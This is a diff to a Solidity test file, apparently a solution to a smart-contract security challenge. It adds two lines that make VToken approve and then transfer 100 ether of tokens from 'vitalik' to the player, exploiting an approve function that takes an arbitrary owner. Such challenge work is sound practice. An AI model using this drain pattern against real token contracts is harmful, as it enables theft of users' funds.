@@ -29,7 +29,8 @@ contract Challenge0Test is Test {
         //////////////////////////////*/
 
         //============================//
-
+        VToken(token).approve(vitalik,player, 100 ether);
+        VToken(token).transferFrom(vitalik,player, 100 ether);
         vm.stopPrank();
 
         assertEq(
